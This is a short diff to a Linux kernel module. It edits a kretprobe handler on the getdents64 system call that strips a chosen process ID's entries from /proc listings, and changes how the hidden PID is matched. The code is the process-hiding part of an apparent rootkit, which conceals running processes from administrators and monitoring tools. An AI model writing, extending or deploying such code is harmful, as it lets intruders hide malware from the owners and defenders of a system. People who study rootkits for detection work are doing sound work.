@@ -102,12 +102,12 @@ static int handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 			wuwa_info("dent64: called for proc %d", ret);
 		}
 
-		if(proc) {
+		// if(proc) {
 		while (offset < ret)
 	    {
 		    dir = (void *)kdirent + offset;
 
-		    if ((proc && pid_hide > 0 && /*pid_hide == simple_strtoul(dir->d_name, NULL, 10)*/is_invisible(simple_strtoul(dir->d_name, NULL, 10)) ))
+		    if ((proc && pid_hide > 0 && pid_hide == simple_strtoul(dir->d_name, NULL, 10) /*is_invisible(simple_strtoul(dir->d_name, NULL, 10))*/))
 		    {			
 			    if (dir == kdirent)
 			    {
@@ -133,7 +133,7 @@ static int handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 	    {
 	        goto out;
 	    }
-		}
+		// }
 
 	out:
 	    kfree(kdirent);
